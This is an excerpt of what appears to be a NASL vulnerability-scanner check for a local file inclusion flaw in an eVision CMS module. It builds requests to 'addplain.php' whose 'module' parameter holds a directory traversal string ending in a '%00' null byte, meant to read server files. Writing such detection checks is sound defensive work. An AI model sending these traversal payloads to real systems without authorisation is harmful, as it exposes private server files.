...
for dir in nasl_make_list_unique( "/evision", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( dir, "/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../" + file + "%00" );
	...
	url = NASLString( dir, "/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: 1 );
	if(!buf){
		continue;
